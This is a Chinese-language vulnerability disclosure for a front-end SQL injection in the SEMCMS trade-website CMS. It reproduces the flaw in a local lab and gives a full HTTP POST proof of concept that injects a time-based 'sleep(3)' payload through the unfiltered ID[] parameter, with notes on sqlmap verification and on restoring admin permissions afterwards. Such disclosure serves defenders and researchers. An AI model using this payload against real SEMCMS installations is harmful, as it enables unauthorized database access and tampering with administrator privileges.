SEMCMS外贸网站管理系统存在前台sql注入漏洞

 

漏洞概述：

SEMCMS是一个支持多种语言的外贸网站内容管理系统(CMS)，由于权限分配功能处对权限ID参数输入没有过滤，导致存在sql注入漏洞。

官网地址：http://www.sem-cms.com

 

漏洞复现：

app="SEMCMS"

![image](https://github.com/lampSEC/semcms/assets/88041357/ef6cafc1-1ff0-4b49-bd58-abad68a556ea)

![image](https://github.com/lampSEC/semcms/assets/88041357/9f6223b2-c531-4c6f-86ff-4f8ec28c6fcc)


后台地址路径是部署成功随机生成的，本地复现需要搭建漏洞环境，最新php版本源码地址：官网下载地址

http://www.sem-cms.com/TradeCmsdown/php/semcms_php_4.8.zip

![image](https://github.com/lampSEC/semcms/assets/88041357/8817ca27-7cc1-40e0-b1aa-0608a9be88e5)


 

ID权限参数拼接sql语句无过滤

![image](https://github.com/lampSEC/semcms/assets/88041357/c449aff6-00a4-4297-86bc-70e2c0473446)


（uid参数是用户的ID，本次复现修改管理员的权限，完成测试后修改数据库进行权限恢复,管理员权限参数为74,76,77,87,88,116,123,170,75,78,79,80,81,82,83,84,89,100,181）

![image](https://github.com/lampSEC/semcms/assets/88041357/e3ca438c-e988-4cc6-b4d4-15954fd45bd8)


构造请求poc

![image](https://github.com/lampSEC/semcms/assets/88041357/29047e76-a987-4d3c-9f55-40f3eda297b8)


管理员权限被修改为77

![image](https://github.com/lampSEC/semcms/assets/88041357/324feef4-9c03-42e3-bb6a-c99ad3827dac)


拼接sql语句进行注入

![image](https://github.com/lampSEC/semcms/assets/88041357/9bdde0ab-f8e8-4699-9349-c26c118343f9)


![image](https://github.com/lampSEC/semcms/assets/88041357/33f660ae-fcf6-49f1-86cd-61414573fc75)


 ```
 POST /MtHDbu_Admin/SEMCMS_User.php?CF=fenpei HTTP/1.1
 Host: 192.168.96.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 28
 Origin: http://192.168.96.1
 Connection: close
 Upgrade-Insecure-Requests: 1
 
 ID[]=77'+and+sleep(3)#&uid=1
 ```



 

Sqlmap验证：

![image](https://github.com/lampSEC/semcms/assets/88041357/90a99dbd-f67b-440d-871d-c66fb1de7db5)


测试完成修改数据库管理员权限

74,76,77,87,88,116,123,170,75,78,79,80,81,82,83,84,89,100,181

![image](https://github.com/lampSEC/semcms/assets/88041357/17b8e1d4-015f-4387-8c2d-4fd69a27a09e)


测试完成（如不想变动管理员权限，复现可创建一个测试用户）

 
